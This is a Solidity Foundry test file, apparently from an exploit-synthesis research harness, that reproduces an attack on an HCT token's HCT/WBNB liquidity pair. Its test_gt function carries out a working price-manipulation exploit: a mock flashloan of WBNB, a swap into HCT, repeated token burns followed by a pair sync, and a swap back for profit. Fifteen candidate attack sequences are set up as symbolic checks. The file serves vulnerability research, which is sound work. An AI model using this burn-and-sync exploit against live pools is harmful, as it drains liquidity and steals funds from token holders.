// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {HCT} from "./HCT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {WBNB} from "@utils/WBNB.sol";

contract HCTTest is Test, BlockLoader {
    WBNB wbnb;
    HCT hct;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address wbnbAddr;
    address hctAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1694072657;
    uint112 reserve0pair = 3717772046944618148783712500;
    uint112 reserve1pair = 65997190154150201517;
    uint32 blockTimestampLastpair = 1694072327;
    uint256 kLastpair = 245362221734290758329030764219727072491889549804;
    uint256 price0CumulativeLastpair = 729587255814590925291688223878;
    uint256 price1CumulativeLastpair =
        2722826325220391734927707496324911789737616281;
    uint256 totalSupplywbnb = 2533000389601163349233474;
    uint256 balanceOfwbnbpair = 65997190154150201517;
    uint256 balanceOfwbnbattacker = 0;
    uint256 totalSupplyhct = 9987704855137886084130217133;
    uint256 balanceOfhctpair = 3717772046944618148783712500;
    uint256 balanceOfhctattacker = 0;

    function setUp() public {
        owner = address(this);
        wbnb = new WBNB();
        wbnbAddr = address(wbnb);
        hct = new HCT(
            "HCT",
            "XAI",
            18,
            9987704855,
            4,
            1,
            5,
            address(0x0),
            address(this)
        );
        hctAddr = address(hct);
        pair = new UniswapV2Pair(
            address(hct),
            address(wbnb),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        wbnb.transfer(address(pair), balanceOfwbnbpair);
        hct.transfer(address(pair), balanceOfhctpair);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Wbnb Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(wbnb),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(address(hct), address(wbnb), hct.decimals());
        emit log_string("");
        emit log_string("Hct Balances: ");
        queryERC20BalanceDecimals(address(wbnb), address(hct), wbnb.decimals());
        queryERC20BalanceDecimals(address(hct), address(hct), hct.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(pair),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(address(hct), address(pair), hct.decimals());
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(attacker),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(hct),
            address(attacker),
            hct.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return wbnb.balanceOf(attacker) >= 1e12 + balanceOfwbnbattacker;
    }

    function borrow_wbnb_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_wbnb_owner(uint256 amount) internal eurus {
        wbnb.transfer(owner, amount);
    }

    function borrow_hct_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        hct.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_hct_owner(uint256 amount) internal eurus {
        hct.transfer(owner, amount);
    }

    function swap_pair_attacker_hct_wbnb(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        hct.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_wbnb_hct(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        wbnb.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function burn_hct_pair(uint256 amount) internal eurus {
        uint256 initBalance = hct.balanceOf(address(attacker));
        while (hct.balanceOf(address(attacker)) > initBalance - amount) {
            hct.burn((hct.balanceOf(address(attacker)) * 8) / 10 - 1);
        }
        pair.sync();
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_hct(amt1, amt2);
        swap_pair_attacker_hct_wbnb(amt3, amt4);
        payback_wbnb_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_wbnb_owner(amt0);
        burn_hct_pair(amt1);
        swap_pair_attacker_wbnb_hct(amt2, amt3);
        swap_pair_attacker_hct_wbnb(amt4, amt5);
        payback_wbnb_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_hct(amt1, amt2);
        burn_hct_pair(amt3);
        swap_pair_attacker_hct_wbnb(amt4, amt5);
        payback_wbnb_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_hct_owner(amt0);
        swap_pair_attacker_hct_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_hct(amt3, amt4);
        payback_hct_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_hct_owner(amt0);
        burn_hct_pair(amt1);
        swap_pair_attacker_hct_wbnb(amt2, amt3);
        swap_pair_attacker_wbnb_hct(amt4, amt5);
        payback_hct_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_hct_owner(amt0);
        swap_pair_attacker_hct_wbnb(amt1, amt2);
        burn_hct_pair(amt3);
        swap_pair_attacker_wbnb_hct(amt4, amt5);
        payback_hct_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_hct(amt1, amt2);
        swap_pair_attacker_hct_wbnb(amt3, amt4);
        swap_pair_attacker_wbnb_hct(amt5, amt6);
        swap_pair_attacker_hct_wbnb(amt7, amt8);
        payback_wbnb_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        burn_hct_pair(amt1);
        swap_pair_attacker_wbnb_hct(amt2, amt3);
        swap_pair_attacker_hct_wbnb(amt4, amt5);
        swap_pair_attacker_wbnb_hct(amt6, amt7);
        swap_pair_attacker_hct_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_hct(amt1, amt2);
        burn_hct_pair(amt3);
        swap_pair_attacker_hct_wbnb(amt4, amt5);
        swap_pair_attacker_wbnb_hct(amt6, amt7);
        swap_pair_attacker_hct_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_hct(amt1, amt2);
        swap_pair_attacker_hct_wbnb(amt3, amt4);
        burn_hct_pair(amt5);
        swap_pair_attacker_wbnb_hct(amt6, amt7);
        swap_pair_attacker_hct_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_hct(amt1, amt2);
        swap_pair_attacker_hct_wbnb(amt3, amt4);
        swap_pair_attacker_wbnb_hct(amt5, amt6);
        burn_hct_pair(amt7);
        swap_pair_attacker_hct_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_hct_owner(amt0);
        swap_pair_attacker_hct_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_hct(amt3, amt4);
        swap_pair_attacker_hct_wbnb(amt5, amt6);
        swap_pair_attacker_wbnb_hct(amt7, amt8);
        payback_hct_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_hct_owner(amt0);
        burn_hct_pair(amt1);
        swap_pair_attacker_hct_wbnb(amt2, amt3);
        swap_pair_attacker_wbnb_hct(amt4, amt5);
        swap_pair_attacker_hct_wbnb(amt6, amt7);
        swap_pair_attacker_wbnb_hct(amt8, amt9);
        payback_hct_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_hct_owner(amt0);
        swap_pair_attacker_hct_wbnb(amt1, amt2);
        burn_hct_pair(amt3);
        swap_pair_attacker_wbnb_hct(amt4, amt5);
        swap_pair_attacker_hct_wbnb(amt6, amt7);
        swap_pair_attacker_wbnb_hct(amt8, amt9);
        payback_hct_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_hct_owner(amt0);
        swap_pair_attacker_hct_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_hct(amt3, amt4);
        burn_hct_pair(amt5);
        swap_pair_attacker_hct_wbnb(amt6, amt7);
        swap_pair_attacker_wbnb_hct(amt8, amt9);
        payback_hct_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_hct_owner(amt0);
        swap_pair_attacker_hct_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_hct(amt3, amt4);
        swap_pair_attacker_hct_wbnb(amt5, amt6);
        burn_hct_pair(amt7);
        swap_pair_attacker_wbnb_hct(amt8, amt9);
        payback_hct_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_wbnb_owner(2200 * 1e18);
        printBalance("After step0 ");
        swap_pair_attacker_wbnb_hct(
            wbnb.balanceOf(attacker),
            (pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb)) * 99) /
                100
        );
        printBalance("After step1 ");
        burn_hct_pair(hct.balanceOf(attacker) - 70);
        printBalance("After step2 ");
        swap_pair_attacker_hct_wbnb(
            hct.balanceOf(attacker),
            pair.getAmountOut(hct.balanceOf(attacker), address(hct))
        );
        printBalance("After step3 ");
        payback_wbnb_owner(2200 * 1e18);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_hct(amt1, amt2);
        burn_hct_pair(amt3);
        swap_pair_attacker_hct_wbnb(amt4, amt5);
        payback_wbnb_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
